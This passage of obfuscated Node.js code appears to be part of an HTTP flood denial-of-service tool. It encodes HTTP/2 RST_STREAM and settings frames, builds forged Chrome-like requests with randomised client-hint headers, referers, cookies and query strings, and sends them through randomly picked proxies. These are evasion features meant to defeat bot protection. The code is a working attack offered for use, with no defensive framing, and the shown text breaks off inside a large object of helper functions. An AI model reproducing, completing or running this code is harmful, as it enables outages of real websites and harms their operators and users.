        _0xcf3208['writeUInt16BE'](_0x5f84ff[_0x4dcdf3][0x0], _0x373216[_0x4b4f('0x66')](_0x4dcdf3, 0x6));
        _0xcf3208['writeUInt32BE'](_0x5f84ff[_0x4dcdf3][0x1], _0x373216[_0x4b4f('0x8e')](_0x4dcdf3 * 0x6, 0x2));
    }
    return _0xcf3208;
}
function encodeRstStream(_0x28ab5b, _0x357b0d, _0x55d306) {
    const _0x26bd85 = Buffer[_0x4b4f('0x1bb')](0x9);
    _0x26bd85[_0x4b4f('0x1a9')](0x4, 0x0);
    _0x26bd85['writeUInt8'](_0x357b0d, 0x4);
    _0x26bd85[_0x4b4f('0x95')](_0x55d306, 0x5);
    _0x26bd85[_0x4b4f('0x1a9')](_0x28ab5b, 0x5);
    const _0x3b96ac = Buffer['alloc'](0x4)[_0x4b4f('0x1b4')](0x0);
    return Buffer[_0x4b4f('0x11c')]([
        _0x26bd85,
        _0x3b96ac
    ]);
}
const getRandomChar = () => {
    const _0x25534b = {
        'rrScn': function (_0x4de8c3, _0x1977f0) {
            return _0x4de8c3 * _0x1977f0;
        }
    };
    const _0x24d8ec = 'abcdefghijklmnopqrstuvwxyz';
    const _0x4bbfba = Math[_0x4b4f('0xb2')](_0x25534b['rrScn'](Math[_0x4b4f('0x184')](), _0x24d8ec[_0x4b4f('0xd')]));
    return _0x24d8ec[_0x4bbfba];
};
function randstr(_0x4625d3) {
    const _0x111785 = {
        'SEPPn': _0x4b4f('0x107'),
        'gTCbA': function (_0x3bc2a1, _0xe743e1) {
            return _0x3bc2a1 < _0xe743e1;
        },
        'cvGgw': function (_0xb3a2c1, _0x579318) {
            return _0xb3a2c1 * _0x579318;
        }
    };
    const _0x294c7f = _0x111785[_0x4b4f('0x171')];
    let _0x1989ca = '';
    const _0x413fa1 = _0x294c7f[_0x4b4f('0xd')];
    for (let _0x2ef0e8 = 0x0; _0x111785[_0x4b4f('0x100')](_0x2ef0e8, _0x4625d3); _0x2ef0e8++) {
        _0x1989ca += _0x294c7f[_0x4b4f('0x12')](Math[_0x4b4f('0xb2')](_0x111785['cvGgw'](Math[_0x4b4f('0x184')](), _0x413fa1)));
    }
    return _0x1989ca;
}
if (url[_0x4b4f('0x30')][_0x4b4f('0x18e')](_0x4b4f('0xb5'))) {
    const randomValue = randstr(0x6) + '&' + randstr(0x6);
    url[_0x4b4f('0x30')] = url[_0x4b4f('0x30')][_0x4b4f('0x13a')](_0x4b4f('0xb5'), randomValue);
}
function randstrr(_0xddf01) {
    const _0x9d3d50 = { 'esWvU': 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-' };
    const _0x2de52b = _0x9d3d50['esWvU'];
    let _0x3d17bd = '';
    const _0x7adaac = _0x2de52b['length'];
    for (let _0x3194d9 = 0x0; _0x3194d9 < _0xddf01; _0x3194d9++) {
        _0x3d17bd += _0x2de52b['charAt'](Math[_0x4b4f('0xb2')](Math['random']() * _0x7adaac));
    }
    return _0x3d17bd;
}
function generateRandomString(_0x435a54, _0x1827a0) {
    const _0x3421c2 = {
        'jyPzM': _0x4b4f('0x107'),
        'pjuxw': function (_0x3b858e, _0x53afb3) {
            return _0x3b858e + _0x53afb3;
        },
        'MVEHs': function (_0x103dac, _0x4df988) {
            return _0x103dac * _0x4df988;
        },
        'rYomr': function (_0x290744, _0x4758d7) {
            return _0x290744 < _0x4758d7;
        },
        'zBLAF': function (_0x3b7fc6, _0x10e1f5) {
            return _0x3b7fc6 * _0x10e1f5;
        }
    };
    const _0x54ea93 = _0x3421c2['jyPzM'];
    const _0x50ed5f = _0x3421c2[_0x4b4f('0x13b')](Math['floor'](_0x3421c2[_0x4b4f('0xe9')](Math[_0x4b4f('0x184')](), _0x3421c2['pjuxw'](_0x1827a0 - _0x435a54, 0x1))), _0x435a54);
    let _0x3aa2ca = '';
    for (let _0x46e628 = 0x0; _0x3421c2[_0x4b4f('0x178')](_0x46e628, _0x50ed5f); _0x46e628++) {
        const _0x3b3f56 = Math[_0x4b4f('0xb2')](_0x3421c2[_0x4b4f('0xc5')](Math[_0x4b4f('0x184')](), _0x54ea93[_0x4b4f('0xd')]));
        _0x3aa2ca += _0x54ea93[_0x3b3f56];
    }
    return _0x3aa2ca;
}
function ememmmmmemmeme(_0x489f8a, _0x472838) {
    const _0x2e51c1 = {
        'gFyPy': _0x4b4f('0x15f'),
        'zlLDu': function (_0x3e80f2, _0x3f28bd) {
            return _0x3e80f2 + _0x3f28bd;
        },
        'EokjN': function (_0x48a3d1, _0x12375e) {
            return _0x48a3d1 * _0x12375e;
        },
        'QiSJL': function (_0x457493, _0x2bbfd2) {
            return _0x457493 - _0x2bbfd2;
        },
        'RiQbe': function (_0x4aae09, _0x382844) {
            return _0x4aae09 < _0x382844;
        }
    };
    const _0x5db7b2 = _0x2e51c1[_0x4b4f('0x79')];
    const _0x4b096f = _0x2e51c1[_0x4b4f('0xcf')](Math[_0x4b4f('0xb2')](_0x2e51c1['EokjN'](Math['random'](), _0x2e51c1[_0x4b4f('0xf6')](_0x472838, _0x489f8a) + 0x1)), _0x489f8a);
    let _0x2feea6 = '';
    for (let _0xaf1d9 = 0x0; _0x2e51c1['RiQbe'](_0xaf1d9, _0x4b096f); _0xaf1d9++) {
        const _0x38baf9 = Math[_0x4b4f('0xb2')](Math[_0x4b4f('0x184')]() * _0x5db7b2[_0x4b4f('0xd')]);
        _0x2feea6 += _0x5db7b2[_0x38baf9];
    }
    return _0x2feea6;
}
function getRandomInt(_0xd8c178, _0x2c8071) {
    const _0x9b7f03 = {
        'IxXNf': function (_0x68281c, _0xce213) {
            return _0x68281c + _0xce213;
        },
        'cHxZu': function (_0xc06419, _0x37726a) {
            return _0xc06419 - _0x37726a;
        }
    };
    return _0x9b7f03[_0x4b4f('0x36')](Math['floor'](Math[_0x4b4f('0x184')]() * _0x9b7f03[_0x4b4f('0x36')](_0x9b7f03[_0x4b4f('0x19')](_0x2c8071, _0xd8c178), 0x1)), _0xd8c178);
}
function buildRequest() {
    const _0x31b28a = {
        'lcawl': function (_0x84cb1, _0x2b4bb4, _0x16abdc) {
            return _0x84cb1(_0x2b4bb4, _0x16abdc);
        },
        'ZdHVx': _0x4b4f('0x15e'),
        'YIyJm': _0x4b4f('0x6c'),
        'OZPLM': function (_0x56b2f8, _0x14fc35) {
            return _0x56b2f8 * _0x14fc35;
        },
        'lFSFB': function (_0x3794f0, _0x338057) {
            return _0x3794f0 === _0x338057;
        },
        'EgSPB': function (_0x1298ec, _0x216547) {
            return _0x1298ec === _0x216547;
        },
        'QZeSs': _0x4b4f('0x14b'),
        'wheml': _0x4b4f('0x1b9'),
        'eHwJY': 'en-US,en;q=0.7',
        'fdhKJ': _0x4b4f('0x44'),
        'ABbdh': function (_0x120a76, _0x3ed02a) {
            return _0x120a76 || _0x3ed02a;
        },
        'waNuW': function (_0x22ff13, _0x58c4d) {
            return _0x22ff13 + _0x58c4d;
        },
        'EACQs': function (_0x52d186, _0x528e76) {
            return _0x52d186 + _0x528e76;
        },
        'EibzR': function (_0x2775a5, _0x40de61) {
            return _0x2775a5 + _0x40de61;
        },
        'HBbwf': function (_0x496451, _0x4ba025) {
            return _0x496451 + _0x4ba025;
        },
        'zLhQJ': function (_0x4d402e, _0x17b5f1) {
            return _0x4d402e + _0x17b5f1;
        },
        'ZscaH': function (_0x1bb7ac, _0x1f9d26) {
            return _0x1bb7ac + _0x1f9d26;
        },
        'GhIfK': _0x4b4f('0x112'),
        'TVvlM': 'Sec-Fetch-Dest:\x20document\x0d\x0a',
        'HCFFJ': _0x4b4f('0xa4'),
        'HORHF': 'Sec-Fetch-User:\x20?1\x0d\x0a',
        'wNvXU': _0x4b4f('0x1ca'),
        'wntfv': _0x4b4f('0x14c')
    };
    const _0xc9f662 = _0x31b28a[_0x4b4f('0xa7')](getRandomInt, 0x78, 0x7b);
    const _0x23e85f = [
        _0x31b28a[_0x4b4f('0x117')],
        _0x31b28a[_0x4b4f('0xb9')]
    ];
    const _0x4963fd = _0x23e85f[Math[_0x4b4f('0xb2')](_0x31b28a[_0x4b4f('0x186')](Math[_0x4b4f('0x184')](), _0x23e85f['length']))];
    let _0x68d7f4;
    if (_0x31b28a[_0x4b4f('0x17f')](_0xc9f662, 0x78)) {
        _0x68d7f4 = '\x22Not_A\x20Brand\x22;v=\x228\x22,\x20\x22Chromium\x22;v=\x22' + _0xc9f662 + _0x4b4f('0x1b3') + _0x4963fd + _0x4b4f('0x131') + _0xc9f662 + '\x22';
    } else if (_0xc9f662 === 0x79) {
        _0x68d7f4 = '\x22Not\x20A(Brand\x22;v=\x2299\x22,\x20\x22' + _0x4963fd + _0x4b4f('0x131') + _0xc9f662 + _0x4b4f('0x61') + _0xc9f662 + '\x22';
    } else if (_0x31b28a[_0x4b4f('0x17f')](_0xc9f662, 0x7a)) {
        _0x68d7f4 = _0x4b4f('0x19c') + _0xc9f662 + _0x4b4f('0x8') + _0x4963fd + _0x4b4f('0x131') + _0xc9f662 + '\x22';
    } else if (_0x31b28a[_0x4b4f('0x17f')](_0xc9f662, 0x7b)) {
        _0x68d7f4 = '\x22' + _0x4963fd + _0x4b4f('0x131') + _0xc9f662 + _0x4b4f('0xfb') + _0xc9f662 + '\x22';
    }
    const _0x268ae1 = _0x31b28a['EgSPB'](_0x4963fd, _0x31b28a['YIyJm']);
    const _0x3c9a60 = _0x268ae1 ? _0x31b28a[_0x4b4f('0x4b')] : _0x4b4f('0x3f');
    const _0x1bfd10 = _0x268ae1 ? _0x31b28a[_0x4b4f('0x8d')] : _0x31b28a[_0x4b4f('0xce')];
    const _0x37236f = 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/' + _0xc9f662 + _0x4b4f('0x111');
    const _0x16c459 = '' + _0x68d7f4;
    const _0x9272d0 = _0x31b28a[_0x4b4f('0x5a')](refererValue, 'rand') ? 'https://' + ememmmmmemmeme(0x6, 0x6) + _0x31b28a['fdhKJ'] : refererValue;
    let _0xa35e78 = '\x0d\x0a';
    let _0x257037 = '\x0d\x0a';
    if (_0x31b28a[_0x4b4f('0xc1')](hcookie, _0x9272d0)) {
        _0xa35e78 = '\x0d\x0a';
        _0x257037 = '';
    } else {
        _0xa35e78 = '';
        _0x257037 = '\x0d\x0a';
    }
    let _0x503b24 = _0x31b28a[_0x4b4f('0x1b6')](_0x31b28a['waNuW'](_0x31b28a[_0x4b4f('0x1b6')](_0x31b28a['EACQs'](_0x31b28a[_0x4b4f('0x1b5')](_0x31b28a['EACQs'](_0x31b28a[_0x4b4f('0x1b5')](_0x31b28a[_0x4b4f('0x5b')](_0x31b28a[_0x4b4f('0x5b')](_0x31b28a[_0x4b4f('0x1b2')](_0x31b28a[_0x4b4f('0x1b2')](_0x31b28a['zLhQJ'](_0x31b28a['ZscaH'](reqmethod + '\x20' + url['pathname'] + _0x4b4f('0x147'), 'Accept:\x20' + _0x3c9a60 + '\x0d\x0a'), _0x31b28a[_0x4b4f('0x93')]), _0x4b4f('0xca') + _0x1bfd10 + '\x0d\x0a'), _0x4b4f('0x1ab')), _0x4b4f('0x1c0')), _0x4b4f('0x16f') + url[_0x4b4f('0x198')] + '\x0d\x0a') + _0x31b28a[_0x4b4f('0x32')], _0x31b28a[_0x4b4f('0x15c')]), _0x4b4f('0xf4')), _0x31b28a[_0x4b4f('0x1c9')]) + 'Upgrade-Insecure-Requests:\x201\x0d\x0a', 'User-Agent:\x20' + _0x37236f + '\x0d\x0a') + (_0x4b4f('0x183') + _0x16c459 + '\x0d\x0a'), _0x31b28a['wNvXU']), _0x31b28a[_0x4b4f('0x12c')]), _0x257037);
    if (hcookie) {
        _0x503b24 += 'Cookie:\x20' + hcookie + '\x0d\x0a';
    }
    if (_0x9272d0) {
        _0x503b24 += _0x4b4f('0x90') + _0x9272d0 + '\x0d\x0a' + _0xa35e78;
    }
    const _0x1f611e = Buffer['from']('' + _0x503b24, 'binary');
    return _0x1f611e;
}
const http1Payload = Buffer['concat'](new Array(0x1)[_0x4b4f('0x1b4')](buildRequest()));
function go() {
    const _0x3bf61c = {
        'JMGFP': function (_0x1fcc96, _0x3f9cda) {
            return _0x1fcc96 / _0x3f9cda;
        },
        'HzyDe': function (_0x1fe613, _0x67bc07) {
            return _0x1fe613 == _0x67bc07;
        },
        'DufYt': function (_0x3cb555) {
            return _0x3cb555();
        },
        'DuPHB': _0x4b4f('0xc6'),
        'waXah': function (_0x4a522f, _0x32c6da, _0x22f8b0, _0x2f541e) {
            return _0x4a522f(_0x32c6da, _0x22f8b0, _0x2f541e);
        },
        'eCHZU': function (_0x1c5b84, _0x3c29de) {
            return _0x1c5b84(_0x3c29de);
        },
        'xgLTH': function (_0x58538c, _0x14c809, _0x1f2f22, _0x41a42e) {
            return _0x58538c(_0x14c809, _0x1f2f22, _0x41a42e);
        },
        'Fyvrx': function (_0x399e23, _0x266c87) {
            return _0x399e23 != _0x266c87;
        },
        'GWisS': function (_0x390c04, _0x4deef1) {
            return _0x390c04 + _0x4deef1;
        },
        'llGks': function (_0x13e4b4, _0x1979d4, _0x56694f, _0x5587aa, _0x7d19c) {
            return _0x13e4b4(_0x1979d4, _0x56694f, _0x5587aa, _0x7d19c);
        },
        'qunIG': _0x4b4f('0x48'),
        'yigBx': function (_0x315b2f, _0x10a010, _0x143864) {
            return _0x315b2f(_0x10a010, _0x143864);
        },
        'CxUIt': function (_0x530024, _0x197183) {
            return _0x530024 / _0x197183;
        },
        'tXzkE': _0x4b4f('0x6c'),
        'HyGOU': function (_0x26670f, _0x29c10d) {
            return _0x26670f * _0x29c10d;
        },
        'HnrPc': _0x4b4f('0x9'),
        'NBDYq': _0x4b4f('0x9d'),
        'WstUI': function (_0x2b0a8d, _0xf9c837) {
            return _0x2b0a8d === _0xf9c837;
        },
        'fkfYU': 'en-US,en;q=0.9',
        'OVCDo': _0x4b4f('0x80'),
        'KFOFz': _0x4b4f('0x2d'),
        'IhgLJ': function (_0x3719b7, _0x10e826) {
            return _0x3719b7 + _0x10e826;
        },
        'dAoCu': 'https://',
        'QJhjp': _0x4b4f('0x44'),
        'IwYzt': function (_0x2699e8, _0x1e872b) {
            return _0x2699e8 && _0x1e872b;
        },
        'uhuFg': _0x4b4f('0x149'),
        'TfmVI': function (_0x4331ea, _0x377f06) {
            return _0x4331ea < _0x377f06;
        },
        'CrdOv': _0x4b4f('0x87'),
        'TeTkv': _0x4b4f('0xbd'),
        'tsEIN': function (_0x1a2375, _0x2160fd) {
            return _0x1a2375 < _0x2160fd;
        },
        'kSAEp': function (_0x44ef83, _0x47b18f) {
            return _0x44ef83 < _0x47b18f;
        },
        'DswNG': function (_0x338a56, _0x53d288) {
            return _0x338a56 - _0x53d288;
        },
        'OjeAi': function (_0x233117, _0x567559) {
            return _0x233117 > _0x567559;
        },
        'nJVWy': _0x4b4f('0x132'),
        'OKcxK': 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
        'omiFz': function (_0x283379, _0x12dac7) {
            return _0x283379 | _0x12dac7;
        },
        'xqgjG': function (_0x422889, _0x2aa45b) {
            return _0x422889 | _0x2aa45b;
        },
        'pHeLE': _0x4b4f('0x7'),
        'tvnGI': '1.1.1.1:3128',
        'QlqBE': function (_0x50586d, _0x2e72a3) {
            return _0x50586d(_0x2e72a3);
        },
        'ImVoo': function (_0x492f74) {
            return _0x492f74();
        },
        'MhZYm': _0x4b4f('0x0')
    };
    var [_0x42b8f1, _0x319772] = _0x3bf61c[_0x4b4f('0x1bd')];
    if (customIP) {
        [_0x42b8f1, _0x319772] = customIP[_0x4b4f('0xc0')](':');
    } else {
        [_0x42b8f1, _0x319772] = proxy[~~_0x3bf61c['HyGOU'](Math[_0x4b4f('0x184')](), proxy[_0x4b4f('0xd')])][_0x4b4f('0xc0')](':');
    }
    let _0x1fda9f;
    if (!_0x319772 || _0x3bf61c[_0x4b4f('0x85')](isNaN, _0x319772)) {
        _0x3bf61c[_0x4b4f('0x1a3')](go);
        return;
    }
    const _0x928331 = net[_0x4b4f('0x41')](_0x3bf61c[_0x4b4f('0x85')](Number, _0x319772), _0x42b8f1, () => {
        const _0x54df1d = {
            'iiPMj': function (_0x4103dc, _0x58dca2) {
                return _0x3bf61c[_0x4b4f('0x152')](_0x4103dc, _0x58dca2);
            },
            'vyFwM': function (_0x3fa339, _0x42936c) {
                return _0x3bf61c[_0x4b4f('0x1bc')](_0x3fa339, _0x42936c);
            },
            'uSTui': function (_0x6346a, _0x4ce249) {
                return _0x3bf61c['HzyDe'](_0x6346a, _0x4ce249);
            },
            'xzhrN': function (_0x607f53) {
                return _0x3bf61c[_0x4b4f('0xaf')](_0x607f53);
            },
            'jXtTt': _0x3bf61c['DuPHB'],
            'AiQvT': function (_0x2cda1e, _0x1625f7) {
                return _0x2cda1e == _0x1625f7;
            },
            'rnXaJ': 'binary',
            'ANEfJ': function (_0x351d6d, _0x263df4, _0x56ce1f, _0x1fa78d) {
                return _0x3bf61c[_0x4b4f('0xed')](_0x351d6d, _0x263df4, _0x56ce1f, _0x1fa78d);
            },
            'NcgDk': function (_0x199805, _0xa985db) {
                return _0x3bf61c[_0x4b4f('0x102')](_0x199805, _0xa985db);
            },
            'fYwuZ': function (_0x5ed53, _0x36eccb, _0x1388e1, _0x49b080) {
                return _0x3bf61c[_0x4b4f('0xf')](_0x5ed53, _0x36eccb, _0x1388e1, _0x49b080);
            },
            'EMYtM': function (_0x277e98, _0x56e87f) {
                return _0x277e98 >= _0x56e87f;
            },
            'mPONS': function (_0x212863, _0x1f07f9) {
                return _0x3bf61c[_0x4b4f('0x1b7')](_0x212863, _0x1f07f9);
            },
            'jQnKG': function (_0x1ce6af, _0x318670) {
                return _0x3bf61c['GWisS'](_0x1ce6af, _0x318670);
            },
            'LNuMq': function (_0x30d446, _0x1817ed, _0x1b4e4b, _0x14197d, _0x26fd52) {
                return _0x3bf61c[_0x4b4f('0x17c')](_0x30d446, _0x1817ed, _0x1b4e4b, _0x14197d, _0x26fd52);
            },
            'RAeae': _0x3bf61c[_0x4b4f('0x138')],
            'RZKLO': function (_0x5d37b0, _0x48db05) {
                return _0x5d37b0 + _0x48db05;
            },
            'oBfLe': _0x4b4f('0x182'),
            'gyvvL': _0x4b4f('0x1b8'),
            'FRPjd': function (_0x586e7e, _0x4caaad, _0x2cbe26) {
                return _0x3bf61c[_0x4b4f('0xf2')](_0x586e7e, _0x4caaad, _0x2cbe26);
            },
            'mbUkN': function (_0x1506d4, _0x4b95cd, _0x5c9d74) {
                return _0x1506d4(_0x4b95cd, _0x5c9d74);
            },
            'dSiIS': function (_0x199499, _0x5c14a5) {
                return _0x3bf61c[_0x4b4f('0xa6')](_0x199499, _0x5c14a5);
            },
            'FuPFt': function (_0x18f85a, _0x5f2906) {
                return _0x18f85a < _0x5f2906;
            },
            'kdint': _0x3bf61c['tXzkE'],
            'Xzlws': function (_0x1eff10, _0x5a8e03) {
                return _0x3bf61c[_0x4b4f('0x2b')](_0x1eff10, _0x5a8e03);
            },
            'FQxdd': _0x3bf61c[_0x4b4f('0xda')],
            'vTuFU': _0x4b4f('0x1d'),
            'bXLYz': _0x3bf61c[_0x4b4f('0xe3')],
            'WJfnb': function (_0x11f02d, _0x17bdb5) {
                return _0x3bf61c['WstUI'](_0x11f02d, _0x17bdb5);
            },
            'bgoVV': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'FCMKF': _0x3bf61c['fkfYU'],
            'zQcSY': _0x3bf61c[_0x4b4f('0x1a4')],
            'opMxF': _0x3bf61c[_0x4b4f('0xf1')],
            'tQsGM': function (_0x499d11, _0x5c3c9c) {
                return _0x3bf61c[_0x4b4f('0x119')](_0x499d11, _0x5c3c9c);
            },
            'ecSLe': function (_0x3f71d8, _0x479f7e) {
                return _0x3bf61c['IhgLJ'](_0x3f71d8, _0x479f7e);
            },
            'aUPpA': _0x3bf61c[_0x4b4f('0x57')],
            'CHQEe': _0x3bf61c[_0x4b4f('0xb8')],
            'etdmk': _0x4b4f('0x73'),
            'AujxA': function (_0x57f0a7, _0x171667) {
                return _0x3bf61c[_0x4b4f('0x18f')](_0x57f0a7, _0x171667);
            },
            'eCKbe': _0x3bf61c[_0x4b4f('0x187')],
            'phsQQ': function (_0xc23e28, _0x4b71b5) {
                return _0x3bf61c[_0x4b4f('0x62')](_0xc23e28, _0x4b71b5);
            },
            'egDJm': _0x3bf61c[_0x4b4f('0x101')],
            'GOpKo': _0x3bf61c[_0x4b4f('0x124')],
            'jYarL': function (_0xd3c80f, _0x2faf6a) {
                return _0xd3c80f && _0x2faf6a;
            },
            'RiaTu': function (_0x567c4e, _0x515721) {
                return _0x3bf61c[_0x4b4f('0x134')](_0x567c4e, _0x515721);
            },
            'XdPqq': _0x4b4f('0x6b'),
            'mYWbe': function (_0x1feccb) {
                return _0x3bf61c[_0x4b4f('0xaf')](_0x1feccb);
            },
            'DTLBT': function (_0x40a885, _0x4525c9) {
                return _0x3bf61c[_0x4b4f('0x1cc')](_0x40a885, _0x4525c9);
            },
            'sPCMe': function (_0x3b840d, _0x27ebac) {
                return _0x3bf61c['DswNG'](_0x3b840d, _0x27ebac);
            },
            'TuBNE': function (_0x103f51, _0x3da598) {
                return _0x3bf61c[_0x4b4f('0xa1')](_0x103f51, _0x3da598);
            },
            'nJuiY': function (_0x44561a, _0x54a54f) {
                return _0x3bf61c['IhgLJ'](_0x44561a, _0x54a54f);
            },
            'VDllY': function (_0x19eec8, _0x4de505) {
                return _0x19eec8 >= _0x4de505;
            },
            'LOGHi': _0x3bf61c[_0x4b4f('0x11f')],
            'eTvZj': _0x3bf61c[_0x4b4f('0x1cd')],
            'TGOvu': function (_0x528f47, _0x57af8f) {
                return _0x3bf61c[_0x4b4f('0xd5')](_0x528f47, _0x57af8f);
            },
            'NKXUi': function (_0x18882e, _0x31eb7f) {
                return _0x3bf61c[_0x4b4f('0xd5')](_0x18882e, _0x31eb7f);
            },
            'TnCnC': function (_0x1b0c6f, _0x59b666) {
                return _0x3bf61c[_0x4b4f('0x148')](_0x1b0c6f, _0x59b666);
            },
            'tYoXp': function (_0x4a5d68, _0x1b9774) {
                return _0x4a5d68 | _0x1b9774;
            },
            'tkRGl': _0x3bf61c[_0x4b4f('0x1af')],
            'sElqa': _0x4b4f('0xbb')
        };
        _0x928331['once']('data', () => {
            const _0x46cfd2 = {
                'itUxL': function (_0x52d7fb, _0x4f52bb) {
                    return _0x54df1d[_0x4b4f('0x1a6')](_0x52d7fb, _0x4f52bb);
                },
                'udnDC': function (_0x6218a0, _0x1ec82d) {
                    return _0x54df1d[_0x4b4f('0xd7')](_0x6218a0, _0x1ec82d);
                },
                'HpmTB': function (_0x5280dd, _0x5c8cd9) {
                    return _0x54df1d['mPONS'](_0x5280dd, _0x5c8cd9);
                },
                'BaQcC': function (_0x2d7a23, _0x4eb916) {
                    return _0x54df1d[_0x4b4f('0xef')](_0x2d7a23, _0x4eb916);
                },
                'uKfjk': function (_0x1cfde0, _0x40754b) {
                    return _0x54df1d[_0x4b4f('0xb7')](_0x1cfde0, _0x40754b);
                },
                'cSeLh': function (_0x47eb7e, _0x1bfac9, _0x1e9513, _0x3b799e, _0x5ed192) {
                    return _0x54df1d[_0x4b4f('0x18b')](_0x47eb7e, _0x1bfac9, _0x1e9513, _0x3b799e, _0x5ed192);
                },
                'aRYTB': function (_0x121079, _0xdf0531) {
                    return _0x54df1d['AiQvT'](_0x121079, _0xdf0531);
                },
                'Bzqjq': function (_0x4ce0e6, _0x4374e0) {
                    return _0x4ce0e6 == _0x4374e0;
                },
                'zxsDn': _0x54df1d[_0x4b4f('0x16b')],
                'eGpoR': function (_0x42cce5, _0x4ae01a) {
                    return _0x42cce5 + _0x4ae01a;
                },
                'POVDo': function (_0x393887, _0xa143e9) {
                    return _0x54df1d['RZKLO'](_0x393887, _0xa143e9);
                },
                'MZPDi': _0x54df1d[_0x4b4f('0x39')],
                'sqjxd': function (_0x50046c, _0x56a311) {
                    return _0x54df1d[_0x4b4f('0xd7')](_0x50046c, _0x56a311);
                },
                'wcrKq': _0x4b4f('0x1ba'),
                'SDjLx': _0x54df1d[_0x4b4f('0x163')],
                'QTPDu': function (_0x39d933, _0x51047e, _0x331efe) {
                    return _0x54df1d[_0x4b4f('0xcd')](_0x39d933, _0x51047e, _0x331efe);
                },
                'PQWDB': function (_0x22fc5c, _0xd49be8) {
                    return _0x22fc5c + _0xd49be8;
                },
                'AUbWU': function (_0x19ac15, _0x51ff9f, _0x2b2646) {
                    return _0x19ac15(_0x51ff9f, _0x2b2646);
                },
                'UqbFS': function (_0x4535bb, _0x5d9ae7, _0x3af3c5) {
                    return _0x54df1d['mbUkN'](_0x4535bb, _0x5d9ae7, _0x3af3c5);
                },
                'BuCmj': function (_0x27b84a, _0x385883) {
                    return _0x54df1d[_0x4b4f('0x173')](_0x27b84a, _0x385883);
                },
                'vEEId': function (_0x51e85e, _0x3705ba) {
                    return _0x51e85e && _0x3705ba;
                },
                'ynDTT': function (_0x47c794, _0x344a1c) {
                    return _0x47c794 !== _0x344a1c;
                },
                'iqkGi': function (_0x1e920b, _0x5030b2, _0x52ed90) {
                    return _0x1e920b(_0x5030b2, _0x52ed90);
                },
                'Oviou': function (_0x2f8867, _0x3a4c1f) {
                    return _0x54df1d[_0x4b4f('0x181')](_0x2f8867, _0x3a4c1f);
                },
                'QEBva': _0x54df1d[_0x4b4f('0x19f')],
                'WFGYb': function (_0x1f8e9f, _0x1f8e21) {
                    return _0x54df1d[_0x4b4f('0x143')](_0x1f8e9f, _0x1f8e21);
                },
                'aWtCc': _0x54df1d[_0x4b4f('0x98')],
                'bmevs': _0x54df1d[_0x4b4f('0x5d')],
                'zrVGy': _0x54df1d[_0x4b4f('0x9c')],
                'uPMcu': function (_0x5d04c6, _0x15f60d) {
                    return _0x54df1d[_0x4b4f('0x65')](_0x5d04c6, _0x15f60d);
                },
                'mKKZW': function (_0x2ea1d8, _0x4e3423) {
                    return _0x54df1d['WJfnb'](_0x2ea1d8, _0x4e3423);
                },
                'CyzsY': function (_0x301ea7, _0x25128b) {
                    return _0x54df1d[_0x4b4f('0x65')](_0x301ea7, _0x25128b);
                },
                'XuuBJ': _0x54df1d[_0x4b4f('0x77')],
                'sgzbX': _0x54df1d[_0x4b4f('0x1a')],
                'WepxW': _0x54df1d[_0x4b4f('0x3b')],
                'EHFwr': _0x54df1d[_0x4b4f('0xfa')],
                'czSTW': '10.0.0',
                'KENHK': _0x4b4f('0x84'),
                'ezjoo': function (_0x22e1ff, _0x3d4062) {
                    return _0x54df1d[_0x4b4f('0x19e')](_0x22e1ff, _0x3d4062);
                },
                'uRWUj': function (_0x45f00a, _0x280200) {
                    return _0x54df1d[_0x4b4f('0xfe')](_0x45f00a, _0x280200);
                },
                'HvvDj': _0x54df1d['aUPpA'],
                'omnux': _0x54df1d[_0x4b4f('0x127')],
                'rzkGW': function (_0x514868, _0x243de7) {
                    return _0x514868 < _0x243de7;
                },
                'mqEuM': function (_0xc49775, _0x31f7ba) {
                    return _0x54df1d[_0x4b4f('0x65')](_0xc49775, _0x31f7ba);
                },
                'edWlf': _0x54df1d[_0x4b4f('0x91')],
                'cnfoz': function (_0x3fca90, _0x388948) {
                    return _0x54df1d[_0x4b4f('0x16')](_0x3fca90, _0x388948);
                },
                'OknSq': function (_0x3a8ffe, _0x2747de) {
                    return _0x54df1d[_0x4b4f('0x181')](_0x3a8ffe, _0x2747de);
                },
                'COrCM': _0x4b4f('0xad'),
                'iPsNc': function (_0x4b19cb, _0x23d6d1) {
                    return _0x4b19cb < _0x23d6d1;
                },
                'gVDql': _0x54df1d[_0x4b4f('0xd6')],
                'xMOnb': function (_0x3f0a19, _0x5d9a27) {
                    return _0x3f0a19 < _0x5d9a27;
                },
                'ptlCu': function (_0x31822f, _0x2813fb) {
                    return _0x54df1d['phsQQ'](_0x31822f, _0x2813fb);
                },
                'GaHgN': _0x54df1d[_0x4b4f('0x168')],
                'zHaCk': _0x54df1d[_0x4b4f('0x16a')],
                'NpFCW': function (_0x377d32, _0x3d672b) {
                    return _0x54df1d[_0x4b4f('0x189')](_0x377d32, _0x3d672b);
                },
                'oizIM': function (_0x2440e0, _0x1f4921) {
                    return _0x54df1d[_0x4b4f('0xd7')](_0x2440e0, _0x1f4921);
                },
                'PdHwu': function (_0x18587e, _0x2c35f5) {
                    return _0x54df1d[_0x4b4f('0x46')](_0x18587e, _0x2c35f5);
                },
                'xPrCn': _0x54df1d[_0x4b4f('0x3c')],
                'spOSg': function (_0x507347, _0x363df7) {
                    return _0x54df1d[_0x4b4f('0x65')](_0x507347, _0x363df7);
                },
                'iIPaa': function (_0x316fd0, _0x2d77e4) {
                    return _0x54df1d[_0x4b4f('0x189')](_0x316fd0, _0x2d77e4);
                },
                'Eakkt': function (_0x429137, _0x4ddfdf) {
                    return _0x429137 && _0x4ddfdf;
                },
                'sKJmq': function (_0x324a38, _0x549f07) {
                    return _0x54df1d[_0x4b4f('0x189')](_0x324a38, _0x549f07);
                },
                'hBTtF': function (_0x2cf33e) {
                    return _0x54df1d[_0x4b4f('0x1d2')](_0x2cf33e);
                },
                'MGAdp': function (_0x216e51, _0x1c53ed) {
                    return _0x54df1d['RiaTu'](_0x216e51, _0x1c53ed);
                },
                'YNEGq': function (_0x93ea44) {
                    return _0x54df1d[_0x4b4f('0xff')](_0x93ea44);
                },
